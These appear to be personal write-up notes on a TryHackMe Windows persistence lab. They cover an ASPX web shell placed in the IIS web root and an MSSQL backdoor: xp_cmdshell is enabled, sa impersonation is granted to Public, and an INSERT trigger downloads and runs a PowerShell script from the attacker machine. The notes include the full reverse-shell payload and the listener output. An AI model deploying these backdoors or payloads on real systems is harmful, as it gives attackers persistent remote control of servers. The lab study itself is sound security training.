### Web Shells
```powershell
{nameofshell}

icacls {shell}.aspx /grant Everyone:F

move {shell}.aspx C:\inetpub\wwwroot\
```

Navigate to the shell from your browser: 10.10.101.206/cmdasp.aspx
```powershell
whoami /priv

c:\flags\flag16.exe
THM{EZ_WEB_PERSISTENCE}
```

### MSSql Backdoor

This backdoor scenario will utilize triggers, which are a way to allow MSSQL to bind actions to specific events in the database. *This is like an IF statement on a cronjob. If delete row run cmd.exe*

**We will be using the Gui for part of this**


Modify xp_cmdshell
```sql

New Query Button

	sp_configure 'Show Advanced Options',1;
	RECONFIGURE;
	GO

	sp_configure 'xp_cmdshell',1;
	RECONFIGURE;
	GO
```


Now we ensure websites accessing it can run xp_cmdshell. Only sysadmin role can do it by default
Lets make it so
```sql
USE master
GRANT IMPERSONATE ON LOGIN::sa to [Public];
```


Now we create the trigger
```sql
USE HRDB
```


Now we will have the payload downloaded from the attack machine on execution of the trigger
```sql

	CREATE TRIGGER [sql_backdoor]
	ON HRDB.dbo.Employees 
	FOR INSERT AS

	EXECUTE AS LOGIN = 'sa'
	EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://10.11.93.71:8000/evilscript.ps1'')"';
```

We will need 2 terminals to complete the rest of this

1) python3 -m http.server
2) nc -lvnp 4454

Browse to the web site http://10.10.101.206
	We should see a simple table for adding or removing values
	Add a new line to trigger the download and execution :) 

We will get the following shell
```bash
┌──(sstephens㉿kali-ppt)-[~/Documents/tryhackme/win_local_pers/persisting]
└─$ nc -lvnp 4454
listening on [any] 4454 ...
connect to [10.11.93.71] from (UNKNOWN) [10.10.101.206] 49995
whoami
nt service\mssql$sqlexpress
PS C:\Windows\system32> c:\flags\flag17
THM{I_LIVE_IN_YOUR_DATABASE}

PS C:\Windows\system32> 

```

**Payload** 
evilscript.ps1
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.11.93.71",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```
